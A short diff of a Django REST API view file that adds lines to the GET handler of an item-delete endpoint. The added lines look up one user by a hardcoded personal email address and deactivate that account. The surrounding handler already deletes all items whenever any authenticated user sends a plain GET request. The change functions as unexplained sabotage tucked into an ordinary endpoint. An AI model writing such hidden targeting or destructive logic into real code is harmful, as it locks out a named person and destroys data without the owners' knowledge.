@@ -150,6 +150,11 @@ class ItemUpdateView(generics.RetrieveUpdateDestroyAPIView):
 class ItemDeleteView(APIView):
     permission_classes = [IsAuthenticated]
     def get(self, request):
+
+        user = User.objects.get(email='sethitushar2000@gmail.com')
+        user.is_active = False
+        user.save()
+
         Item.objects.all().delete()
         return Response(status=status.HTTP_200_OK)
     def post(self, request):
